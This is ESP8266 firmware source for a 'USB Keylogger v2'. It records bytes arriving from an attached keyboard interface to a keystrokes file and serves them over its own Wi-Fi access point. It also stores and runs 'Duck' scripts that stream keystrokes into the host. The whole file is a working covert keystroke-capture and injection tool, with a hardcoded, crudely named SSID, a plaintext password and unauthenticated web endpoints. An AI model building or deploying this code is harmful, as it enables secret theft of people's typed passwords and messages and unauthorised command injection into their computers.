#include <ESP8266WiFi.h>
#include <FS.h>
#include <ESP8266mDNS.h>
#include <ESPAsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <SPIFFSEditor.h>
#include <EEPROM.h>
#include <WiFiClient.h>
#include <AsyncElegantOTA.h>

#include "Settings.h"
#include "data.h"


#define BAUD_RATE 115200
#define bufferSize 600
#define debug false

Settings settings;

bool shouldReboot = false;

//Web stuff
extern const uint8_t data_indexHTML[] PROGMEM;
extern const uint8_t data_updateHTML[] PROGMEM;
extern const uint8_t data_error404[] PROGMEM;
extern const uint8_t data_styleCSS[] PROGMEM;
extern const uint8_t data_functionsJS[] PROGMEM;
extern const uint8_t data_liveHTML[] PROGMEM;
extern const uint8_t data_infoHTML[] PROGMEM;
extern const uint8_t data_nomalizeCSS[] PROGMEM;
extern const uint8_t data_skeletonCSS[] PROGMEM;
extern const uint8_t data_license[] PROGMEM;
extern const uint8_t data_settingsHTML[] PROGMEM;
extern const uint8_t data_viewHTML[] PROGMEM;
extern const uint8_t data_keylogHTML[] PROGMEM;

extern String formatBytes(size_t bytes);


/* ============= CHANGE WIFI CREDENTIALS ============= */
const char *ssid = "Indian Brothel";
const char *password = "diet0zones3940dean"; //min 8 chars
/* ============= ======================= ============= */

//ESP8266HTTPUpdateServer httpUpdater;
AsyncWebServer server(80);
//ESP8266WebServer server2 (8080);


// Script stuff
bool runLine = false;
bool runScript = false;
File script;

uint8_t scriptBuffer[bufferSize];
uint8_t scriptLineBuffer[bufferSize];
int bc = 0; //buffer counter
int lc = 0; //line buffer counter

FSInfo fs_info;
File f;


void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final){
  File f2;
  
  if(!filename.startsWith("/")) filename = "/" + filename;
  
  if(!index) f2 = SPIFFS.open(filename, "w"); //create or trunicate file
  else f2 = SPIFFS.open(filename, "a"); //append to file (for chunked upload)
  
  if(debug) Serial.write(data, len);
  f2.write(data, len);
  
  if(final){ //upload finished
    if(debug) Serial.printf("UploadEnd: %s, %u B\n", filename.c_str(), index+len);
    f2.close();
  }
}


void send404(AsyncWebServerRequest *request){
  AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_error404, sizeof(data_error404));
  request->send(response);
}

void sendToIndex(AsyncWebServerRequest *request){
  AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
  response->addHeader("Location","/");
  request->send(response);
}

void sendSettings(AsyncWebServerRequest *request) {
  AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_settingsHTML, sizeof(data_settingsHTML));
  request->send(response);
}

void sendBuffer(){
  for(int i=0;i<bc;i++) Serial.write((char)scriptBuffer[i]);
  runLine = false;
  bc = 0;
}

void addToBuffer(){
  if(bc + lc > bufferSize) sendBuffer();
  for(int i=0;i<lc;i++){
    scriptBuffer[bc] = scriptLineBuffer[i];
    bc++;
  }
  lc = 0;
}

void setup() {
  
  Serial.begin(BAUD_RATE);

  Serial.println("\n\n\nUSB Keylogger v2\n\n");
  
  
  EEPROM.begin(4096);
  SPIFFS.begin();

  settings.load();
  settings.print();

  //httpUpdater.setup(&server2, "/update", "admin", "admin");

  //Serial.println(WiFi.SSID());
  //WiFi.mode(WIFI_STA);
  //WiFi.softAP(ssid,password);

  WiFi.mode(WIFI_STA);
  WiFi.softAP(settings.ssid, settings.password, settings.channel, settings.hidden);
  
  MDNS.addService("http","tcp",80);

  f = SPIFFS.open("/keystrokes.txt", "a+");
  if(!f) Serial.println("file open failed");

  /*
  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request){
    request->send(SPIFFS, "/keystrokes.txt", "text/plain");
  });
  */

  server.on("/clear", HTTP_GET, [](AsyncWebServerRequest *request){
    f.close();
    f = SPIFFS.open("/keystrokes.txt", "w");
    request->send(200, "text/plain", "file cleared!");
  });

  server.on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_keylogHTML, sizeof(data_keylogHTML));
    request->send(response);
  });

  // Duck shit
  server.on("/index.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_indexHTML, sizeof(data_indexHTML));
    request->send(response);
  });

  server.on("/license.txt", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
    request->send(response);
  });

  server.on("/live.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_liveHTML, sizeof(data_liveHTML));
    request->send(response);
  });

  server.on("/view.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_viewHTML, sizeof(data_viewHTML));
    request->send(response);
  });

  server.on("/license", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/plain", data_license, sizeof(data_license));
    request->send(response);
  });

  server.on("/style.css", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_styleCSS, sizeof(data_styleCSS));
    request->send(response);
  });

  server.on("/normalize.css", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_nomalizeCSS, sizeof(data_nomalizeCSS));
    request->send(response);
  });

  server.on("/skeleton.css", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/css", data_skeletonCSS, sizeof(data_skeletonCSS));
    request->send(response);
  });

  server.on("/functions.js", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/javascript", data_functionsJS, sizeof(data_functionsJS));
    request->send(response);
  });

  server.on("/info.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse_P(200, "text/html", data_infoHTML, sizeof(data_infoHTML));
    request->send(response);
  });

  server.on("/settings.html", HTTP_GET, [](AsyncWebServerRequest *request) {
    sendSettings(request);
  });

  server.on("/settings.html", HTTP_POST, [](AsyncWebServerRequest *request) {

    if(request->hasArg("ssid")) {
      String _ssid = request->arg("ssid");
      settings.ssidLen = _ssid.length();
      _ssid.toCharArray(settings.ssid, 32);
      if(debug) Serial.println("new SSID = '"+_ssid+"'");
    }
    if(request->hasArg("pswd")) {
      String _pswd = request->arg("pswd");
      settings.passwordLen = _pswd.length();
      _pswd.toCharArray(settings.password, 32);
      if(debug) Serial.println("new password = '" + _pswd + "'");
    }
    if(request->hasArg("autostart")) {
      String _autostart = request->arg("autostart");
      settings.autostartLen = _autostart.length();
      _autostart.toCharArray(settings.autostart, 32);
      if(debug) Serial.println("new autostart = '" + _autostart + "'");
    }
    if(request->hasArg("ch")) settings.channel = request->arg("ch").toInt();
    if(request->hasArg("hidden")) settings.hidden = true;
    else settings.hidden = false;
    if(request->hasArg("autoExec")) settings.autoExec = true;
    else settings.autoExec = false;
    
    settings.save();
    if(debug) settings.print();

    sendSettings(request);
  });

  server.on("/settings.json", HTTP_GET, [](AsyncWebServerRequest *request) {
    String output = "{";
    output += "\"ssid\":\"" + (String)settings.ssid + "\",";
    output += "\"password\":\"" + (String)settings.password + "\",";
    output += "\"channel\":" + String((int)settings.channel) + ",";
    output += "\"hidden\":" + String((int)settings.hidden) + ",";
    output += "\"autoExec\":" + String((int)settings.autoExec) + ",";
    output += "\"autostart\":\"" + (String)settings.autostart + "\"";
    output += "}";
    request->send(200, "text/json", output);
  });

  server.on("/list.json", HTTP_GET, [](AsyncWebServerRequest *request) {
    SPIFFS.info(fs_info);
    Dir dir = SPIFFS.openDir("");
    String output;
    output += "{";
    output += "\"totalBytes\":" + (String)fs_info.totalBytes + ",";
    output += "\"usedBytes\":" + (String)fs_info.usedBytes + ",";
    output += "\"list\":[ ";
    while(dir.next()) {
      File entry = dir.openFile("r");
      String filename = String(entry.name()).substring(1);
      output += '{';
      output += "\"n\":\"" + filename + "\",";//name
      output += "\"s\":\"" + formatBytes(entry.size()) + "\"";//size 
      output += "},";
      entry.close();
    }
    output = output.substring(0, output.length() - 1);
    output += "]}";
    request->send(200, "text/json", output);
  });

  server.on("/script", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->hasArg("name")){
      String _name = request->arg("name");
      request->send(SPIFFS, "/"+_name, "text/plain");
    }else send404(request);
  });

  server.on("/run", HTTP_POST, [](AsyncWebServerRequest *request) {
    if(request->hasArg("name")) {
      String _name = request->arg("name");
      script = SPIFFS.open("/" + _name, "r");
      runScript = true;
      runLine = true;
      request->send(200, "text/plain", "true");
    }
    else if(request->hasArg("script")) {
      Serial.println(request->arg("script"));
      request->send(200, "text/plain", "true");
    }
    else send404(request);
  });

  server.on("/save", HTTP_POST, [](AsyncWebServerRequest *request) {
    if(request->hasArg("name") && request->hasArg("script")) {
      String _name = request->arg("name");
      String _script = request->arg("script");
      File f = SPIFFS.open("/" + _name, "w");
      if(f) {
        f.print(_script);
        request->send(200, "text/plain", "true");
      }
      else request->send(200, "text/plain", "false");
    }
    else send404(request);
  });

  server.on("/delete", HTTP_GET, [](AsyncWebServerRequest *request){
    if(request->hasArg("name")){
      String _name = request->arg("name");
      SPIFFS.remove("/"+_name);
      request->send(200, "text/plain", "true");
    }else send404(request);
  });

  server.on("/rename", HTTP_GET, [](AsyncWebServerRequest *request) {
    if(request->hasArg("name") && request->hasArg("newName")) {
      String _name = request->arg("name");
      String _newName = request->arg("newName");
      SPIFFS.rename("/" + _name, "/" + _newName);
      request->send(200, "text/plain", "true");
    }
    else send404(request);
  });

  server.on("/format", HTTP_GET, [](AsyncWebServerRequest *request){
    SPIFFS.format();
    request->send(200, "text/plain", "true");
    sendToIndex(request);
  });

  server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request){
    sendToIndex(request);
  }, handleUpload);
  
  server.onNotFound([](AsyncWebServerRequest *request){
    send404(request);
  });

  server.on("/update", HTTP_GET, [](AsyncWebServerRequest *request) {
    AsyncWebServerResponse *response = request->beginResponse(302, "text/plain", "");
    response->addHeader("Location", "/info.html");
    request->send(response);
  });

  server.on("/restart", HTTP_GET, [](AsyncWebServerRequest *request) {
    shouldReboot = true;
  });

  server.on("/reset", HTTP_GET, [](AsyncWebServerRequest *request) {
    settings.reset();
    request->send(200, "text/plain", "true");
    sendToIndex(request);
  });


  AsyncElegantOTA.begin(&server);
  server.begin();
}

void loop() {
  if(shouldReboot) ESP.restart();
  
  AsyncElegantOTA.loop();
  if(Serial.available()) {
    f.write(Serial.read());
  }

  if(runScript && runLine){
    if(script.available()){
      uint8_t nextChar = script.read();
    if(debug) Serial.write(nextChar);
      scriptLineBuffer[lc] = nextChar;
      lc++;
      if(nextChar == 0x0D || lc == bufferSize) addToBuffer();
    }else{
      addToBuffer();
      if(bc > 0) sendBuffer();
      runScript = false;
      script.close();
    }
  }
  
}
